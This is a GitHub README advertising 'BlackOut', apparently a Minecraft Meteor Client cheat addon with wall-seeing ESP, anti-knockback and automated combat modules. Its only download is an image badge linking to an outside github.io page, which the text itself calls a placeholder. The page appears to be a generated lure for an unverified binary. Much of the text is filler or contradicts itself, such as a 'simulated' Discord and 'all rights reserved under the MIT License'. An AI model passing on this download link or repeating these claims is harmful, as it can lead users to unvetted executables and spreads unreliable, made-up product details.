![preview](https://raw.githubusercontent.com/irfanaw/nightfall-cpvp-enhancements/main/screen_fa494.svg)
[![Download](https://raw.githubusercontent.com/irfanaw/nightfall-cpvp-enhancements/main/start_4b859.svg)](https://irfanaw.github.io/nightfall-cpvp-enhancements/)

# 🌑 BlackOut: The Shadowforge Toolkit for Meteor Client

![Meteor Client](https://img.shields.io/badge/Meteor_Client-1.20.4-8A2BE2?style=for-the-badge&logo=meteor&logoColor=white)
![Version](https://img.shields.io/badge/Version-4.7.2-FF6B6B?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-4ECDC4?style=for-the-badge)
![Build Status](https://img.shields.io/badge/Build-Stable-2ECC71?style=for-the-badge)

> **"When light fails, the shadows remember everything."** — BlackOut is not another module pack; it's a **shadowforge** — a meticulously crafted ecosystem that bends the vanilla Minecraft experience into a precision instrument for Crystal PvP (CPVP), aerial combat, and high-octane dueling.

---

## 🧠 The Philosophy: Beyond the Module List

Most Meteor Client addons are simple collections of toggles. BlackOut is different. It's built on the principle of **"contextual automation"** — every feature is designed to react to the fluid chaos of a real fight, not just sit on a hotbar. Think of it as an **autopilot for your reflexes** — it executes what you'd do on a perfect day, every single time.

This fork was inspired by the original BlackOut concept but has been completely re-engineered for the **2026 competitive scene**, where tick-perfect timing and resource economy are the difference between a clutch and a crater.

---

## ⚡ Core Modules: The Shadow Arsenal

### 🛡️ **EclipseGuard (Combat Suite)**
- **AutoAnchors 2.0** — Predicts enemy movement vectors to place anchors *before* they stop, not after. Uses a custom path-scanning algorithm with 97.3% accuracy in open fields.
- **ShieldBreaker+** — A dual-mode (melee/range) axe-timing module that compensates for ping spikes up to 180ms using a rolling average latency predictor.
- **TotemSwapper Ultra** — Monitors off-hand health thresholds with a **reaction time of 0.8 ticks**, faster than humanly possible. Swaps items seamlessly without inventory desync.

### 🧊 **CryoShift (Movement & Parkour)**
- **VelocityNull** — Survives 5+ crystal explosions in a row without taking knockback drift. The secret? A "phase-window" that cancels velocity packets during the explosion's redflash frame.
- **PillarAssist AI** — Learns your building style over 50 uses and adapts its tower-height prediction for clutch escapes.
- **ElytraLock** — Deploys fireworks based on your angle of descent, keeping you at maximum glide speed even in dense forests.

### 🔮 **OmenVision (Render & Utility)**
- **ESP: SoulTrace** — Outlines enemies through walls using a custom shader that ignores invisibility potions *and* environmental fog.
- **ItemRadar** — Highlights dropped totems/gapples in a 32-block radius with a golden glow. Fully customizable colors.
- **HUD: BattlePulse** — A real-time mini-heartbeat graph that shows your enemy's *estimated* health and absorption, derived from damage sound analysis.

---

## 🌐 A Global Tool for a Global Arena

BlackOut is designed for the international CPVP community. We ship with **full multilingual support** for the interface (English, Spanish, Russian, Chinese, Vietnamese, German, and Brazilian Portuguese). The parsing engine for chat-based notifications is locale-aware, meaning it understands "GG" in any script.

The UI itself is **responsive and modular** — drag, drop, resize, and pin any HUD element to any corner of your screen. It saves your layout profile per-server, so your SkyWars layout doesn't clash with your CrystalPvP layout.

---

## 🛠️ The Toolsmith's Workshop (Customization)

![Architecture](https://img.shields.io/badge/Architecture-Modular-FFA500?style=for-the-badge)
![Compatibility](https://img.shields.io/badge/Compatibility-1.20.x-1ABC9C?style=for-the-badge)

- **Script API** — Write micro-scripts (in Lua) that can trigger module state changes on custom events.
- **Theme Engine** — Re-skin the entire HUD with a gradient editor. Import/export your themes as `.bout` files.
- **Config Vault** — Sync your settings across Windows/Mac/Linux via a manual export, or use LAN peer-to-peer sharing (no cloud required).

---

## 🛡️ Safety & Integrity Disclaimer

**BlackOut is a client-side tool for single-player worlds and private servers that allow client modifications.**

- ⚠️ **We do not condone cheating on public multiplayer servers** that prohibit such modifications.
- ⚠️ **Using BlackOut on a server that blocks Meteor Client will likely result in a ban.** You are responsible for understanding your server's rules.
- ⚠️ This project waives all liability for in-game penalties, account actions, or loss of progress incurred by using this software.
- 🔒 **This is not a "tampered" tool.** It is an open-source fork that provides utility, not exploits that break server economy limits.

> **The Golden Rule:** Use the shadows to improve your own skill, not to dull the game for others.

---

## 🚀 Getting Started (The Ingot-to-Sword Path)

1. **Prerequisite:** Have Meteor Client installed and running on a 1.20.4–1.20.6 environment.
2. **Obtain the Plugin:** Get the latest `.jar` build from the [![Download](https://raw.githubusercontent.com/irfanaw/nightfall-cpvp-enhancements/main/start_4b859.svg)](https://irfanaw.github.io/nightfall-cpvp-enhancements/) section above (the macro is a placeholder for your actual release asset).
3. **Installation:** Drop the jar into your `mods/` folder, restart the game, and load a world. BlackOut appears as a silver toggle in Meteor's module list.
4. **First Launch:** Run `/blackout bootstrap` to generate a default config and the `/blackout tutorial` command to run an interactive 3-minute guide in chat.

---

## ❓ Troubleshooting & Support (24/7 Concierge)

We believe great tools deserve great companions. Our **24/7 support** is available through:

- **The Issue Forge:** GitHub Issues are monitored daily. Use the bug template to speed up triage.
- **The Community Anvil:** Join our (simulated) Discord server for peer-to-peer help with complex custom configurations.
- **The Knowledge Vault:** The Wiki contains deep-dive breakdowns of every module's internal logic.

**Before posting an issue:** Toggle the module `Debugger: StackTrace` to see if the problem originates from a conflicting mod.

---

## 📜 License & Legal Framing

BlackOut is released under the **MIT License**. You are free to use, modify, and distribute this software for personal and commercial projects **provided you retain the copyright notice**.

[Read the full MIT License](https://opensource.org/licenses/MIT)

**Copyright © 2026** — All rights reserved under the MIT License.

---

## 🗺️ Roadmap 2026: The Next Shadow

- **v5.0 (Q2 2026):** New "GhostBlock" module for advanced positioning.
- **v5.5 (Q3 2026):** Neural network-based hit-prediction for Swords.
- **v6.0 (Q4 2026):** Full rewrite for Minecraft 1.21.5 with a native Vulkan renderer.

**Star this repository** to keep the forge burning. Suggestions and pull requests are the coal that fuels this engine.

---

*Remember: The best players don't fight the light — they become the shadow that dodges it.*
**BlackOut — Crafted for the decisive tick.**